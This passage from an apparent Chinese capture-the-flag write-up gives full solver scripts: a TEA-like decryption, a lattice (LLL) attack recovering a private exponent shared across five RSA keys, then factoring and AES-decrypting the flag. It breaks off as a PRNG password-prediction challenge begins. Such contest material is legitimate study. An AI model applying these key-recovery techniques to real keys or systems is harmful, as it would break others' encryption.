class="number">0x67</span>,<span class="number">0xAE</span>,<span class="number">0xB5</span>,<span class="number">0x29</span>,<span class="number">0x04</span>,<span class="number">0x9E</span>,<span class="number">0x86</span>,<span class="number">0xC5</span>,<span class="number">0x43</span>,</span><br><span class="line"><span class="number">0x23</span>,<span class="number">0x0F</span>,<span class="number">0xBF</span>,<span class="number">0xA6</span>,<span class="number">0xB2</span>,<span class="number">0xAE</span>,<span class="number">0x4A</span>,<span class="number">0xB5</span>,<span class="number">0xC5</span>,<span class="number">0x69</span>,<span class="number">0xB7</span>,<span class="number">0xA8</span>,<span class="number">0x03</span>,<span class="number">0xD1</span>,<span class="number">0xAE</span>,<span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x2C</span>,<span class="number">0x5B</span>,<span class="number">0x7F</span>,<span class="number">0xA2</span>,<span class="number">0x86</span>,<span class="number">0x1E</span>,<span class="number">0x1A</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get32</span>(<span class="params">b, off</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, b, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set32</span>(<span class="params">b, off, v</span>):</span><br><span class="line">    struct.pack_into(<span class="string">&quot;&lt;I&quot;</span>, b, off, v &amp; MASK)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_like</span>(<span class="params">x, k</span>):</span><br><span class="line">    v0, v1 = x</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    sumv = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        sumv = (sumv - delta) &amp; MASK</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        sumv = (sumv + delta) &amp; MASK</span><br><span class="line">        t1 = (((v0 &lt;&lt; <span class="number">4</span>) &amp; MASK) + k[<span class="number">2</span>]) &amp; MASK</span><br><span class="line">        t2 = (v0 + sumv) &amp; MASK</span><br><span class="line">        t3 = (((v0 &gt;&gt; <span class="number">5</span>) &amp; MASK) + k[<span class="number">3</span>]) &amp; MASK</span><br><span class="line">        v1 = (v1 - (t1 ^ t2 ^ t3)) &amp; MASK</span><br><span class="line">        t1 = (((v1 &lt;&lt; <span class="number">4</span>) &amp; MASK) + k[<span class="number">0</span>]) &amp; MASK</span><br><span class="line">        t2 = (v1 + sumv) &amp; MASK</span><br><span class="line">        t3 = (((v1 &gt;&gt; <span class="number">5</span>) &amp; MASK) + k[<span class="number">1</span>]) &amp; MASK</span><br><span class="line">        v0 = (v0 - (t1 ^ t2 ^ t3)) &amp; MASK</span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line">p1 = get32(buf, <span class="number">0</span>)</span><br><span class="line">p2 = get32(buf, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">1</span>, -<span class="number">2</span>):  <span class="comment"># 8,6,4,2</span></span><br><span class="line">    off = i * <span class="number">4</span></span><br><span class="line">    v3 = get32(buf, off) ^ p1</span><br><span class="line">    v4 = get32(buf, off + <span class="number">4</span>) ^ p2</span><br><span class="line">    set32(buf, off, v3)</span><br><span class="line">    set32(buf, off + <span class="number">4</span>, v4)</span><br><span class="line">    p1, p2 = tea_like((p1, p2), KEYS)</span><br><span class="line">    set32(buf, <span class="number">0</span>, p1)</span><br><span class="line">    set32(buf, <span class="number">4</span>, p2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1, p2 = tea_like((p1, p2), KEYS)</span><br><span class="line">set32(buf, <span class="number">0</span>, p1)</span><br><span class="line">set32(buf, <span class="number">4</span>, p2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, buf.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="unsafe-parameters">Unsafe Parameters</span><a href="#unsafe-parameters" class="header-anchor"></a></h2><p>多因子共私钥攻击，按照这篇论文去打</p>
<p><a href="http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf">http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e4 = <span class="number">1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span></span><br><span class="line">e3 = <span class="number">528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span></span><br><span class="line">e2 = <span class="number">120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span></span><br><span class="line">e1 = <span class="number">63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span></span><br><span class="line">e0 = <span class="number">271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span></span><br><span class="line">n4 = <span class="number">1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span></span><br><span class="line">n3 = <span class="number">1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span></span><br><span class="line">n2 = <span class="number">966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span></span><br><span class="line">n1 = <span class="number">801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span></span><br><span class="line">n0 = <span class="number">729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span></span><br><span class="line"></span><br><span class="line">t = n4 ** <span class="number">2</span></span><br><span class="line">M = gmpy2.iroot(t, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(M.bit_length())</span><br><span class="line">L = Matrix(ZZ, [[M, e0, e1, e2, e3, e4],</span><br><span class="line">                [<span class="number">0</span>, -n0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, -n1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n2, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n3, <span class="number">0</span>], </span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n4]])</span><br><span class="line"></span><br><span class="line">d = (L.LLL()[<span class="number">2</span>][<span class="number">0</span>])// M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span></span><br><span class="line"><span class="built_in">print</span>(d.bit_length())</span><br></pre></td></tr></table></figure>

<p>然后就是已知e，d，n分解n了，套板子梭哈</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e4 = <span class="number">1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span></span><br><span class="line">e3 = <span class="number">528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span></span><br><span class="line">e2 = <span class="number">120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span></span><br><span class="line">e1 = <span class="number">63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span></span><br><span class="line">e0 = <span class="number">271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span></span><br><span class="line">n4 = <span class="number">1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span></span><br><span class="line">n3 = <span class="number">1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span></span><br><span class="line">n2 = <span class="number">966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span></span><br><span class="line">n1 = <span class="number">801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span></span><br><span class="line">n0 = <span class="number">729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span></span><br><span class="line"></span><br><span class="line">t = n4 ** <span class="number">2</span></span><br><span class="line">M = gmpy2.iroot(t, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(M.bit_length())</span><br><span class="line">L = Matrix(ZZ, [[M, e0, e1, e2, e3, e4],</span><br><span class="line">                [<span class="number">0</span>, -n0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, -n1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n2, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n3, <span class="number">0</span>], </span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -n4]])</span><br><span class="line"></span><br><span class="line">d = (L.LLL()[<span class="number">2</span>][<span class="number">0</span>])// M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span></span><br><span class="line"><span class="built_in">print</span>(d.bit_length())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_512</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_one_factor</span>(<span class="params">n, e, d</span>):</span><br><span class="line">    m = e * d - <span class="number">1</span></span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">while</span> t % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        t //= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)</span><br><span class="line">        v = <span class="built_in">pow</span>(a, t, n)</span><br><span class="line">        <span class="keyword">if</span> v == <span class="number">1</span> <span class="keyword">or</span> v == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        v_prev = v</span><br><span class="line">        <span class="keyword">while</span> v != <span class="number">1</span>:</span><br><span class="line">            v_prev = v</span><br><span class="line">            v = <span class="built_in">pow</span>(v, <span class="number">2</span>, n)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> v == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">                factor = GCD(v_prev - <span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">if</span> factor != <span class="number">1</span> <span class="keyword">and</span> factor != n:</span><br><span class="line">                    <span class="keyword">return</span> factor </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_factors</span>(<span class="params">n, e, d</span>):</span><br><span class="line"></span><br><span class="line">    factors_found = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">num</span>):</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        f = get_one_factor(num, e, d)     </span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            factors_found.append(num)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        solve(f)</span><br><span class="line">        solve(num // f)</span><br><span class="line">    solve(n)</span><br><span class="line">    <span class="keyword">return</span> factors_found</span><br><span class="line"></span><br><span class="line">ns = [<span class="number">729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span>, <span class="number">1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span>, <span class="number">1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span>, <span class="number">801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span>, <span class="number">966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span>]</span><br><span class="line">es = [<span class="number">271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span>, <span class="number">1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span>, <span class="number">528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span>, <span class="number">63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span>, <span class="number">120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span>]</span><br><span class="line"></span><br><span class="line">ct = <span class="string">b&#x27;J\x08\x0c\xfe\x0eC\n\x96!\xb3\x05\xa9\x9b\xf9\n\xe3-\xf2m\xdb&amp;.\xb5h\xe1\x0e\xd6\x89\x14\x87Z\x0b0p\xbb\xd9\x93\xd7\x1cT\xa2\xf36\x02\x8e:\\\x92&#x27;</span></span><br><span class="line"></span><br><span class="line">total_sum_of_primes = <span class="number">0</span></span><br><span class="line">all_ps_tuples = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ns <span class="keyword">or</span> ns[<span class="number">0</span>] == ...:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;错误：请在脚本中填入 ns, es, ct 和 d 的实际值。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 遍历每一对 (n, e)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ns)):</span><br><span class="line">            n = ns[i]</span><br><span class="line">            e = es[i]</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在分解 n<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;n&#125;</span> ...&quot;</span>)</span><br><span class="line">            factors = find_all_factors(n, e, d)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 你的代码显示 n = p*q*r</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(factors)) == <span class="number">3</span>: <span class="comment"># 使用 set 来处理分解出相同因子的情况</span></span><br><span class="line">                p, q, r = factors</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到因子: <span class="subst">&#123;p&#125;</span>, <span class="subst">&#123;q&#125;</span>, <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">                all_ps_tuples.append((p, q, r))</span><br><span class="line">                total_sum_of_primes += (p + q + r)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;所有素因子的总和: <span class="subst">&#123;total_sum_of_primes&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        key = SHA3_512.new(<span class="built_in">str</span>(total_sum_of_primes).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算得到的 AES 密钥 (hex): <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        flag_padded = cipher.decrypt(ct)</span><br><span class="line">        flag = unpad(flag_padded, <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n===================================&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密成功! Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;===================================&quot;</span>)</span><br><span class="line">        <span class="comment">#flag&#123;9b31dd3e-aa6a-4c4d-b796-bff4e4dfe0cc&#125;</span></span><br></pre></td></tr></table></figure>

<h2><span id="fms">FMS</span><a href="#fms" class="header-anchor"></a></h2><p>粗略阅读代码可以知道<code>admin</code>用户的密码是由<code>PRNG</code>类对象<code>prng</code>的<code>choices</code>方法生成的，所以如果我们要获得密码的话只能先知道<code>prng</code>的种子是什么，观察代码中的<code>PRNG</code>类:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a=<span class="literal">None</span>, b=<span class="literal">None</span>, p=<span class="literal">None</span>, seed=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = p <span class="keyword">if</span> p <span class="keyword">else</span> getPrime(<span class="number">128</span>)</span><br><span class="line">        <span class="variable language_">self</span>.a = a <span class="keyword">if</span> a <span class="keyword">else</span> randrange(<span class="number">1</span>, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="variable language_">self</span>.b = b <span class="keyword">if</span> b <span class="keyword">else</span> randrange(<span class="number">0</span>, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="variable language_">self</span>.state = seed <span class="keyword">if</span> seed <span class="keyword">else</span> randrange(<span class="number">0</span>, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.state = 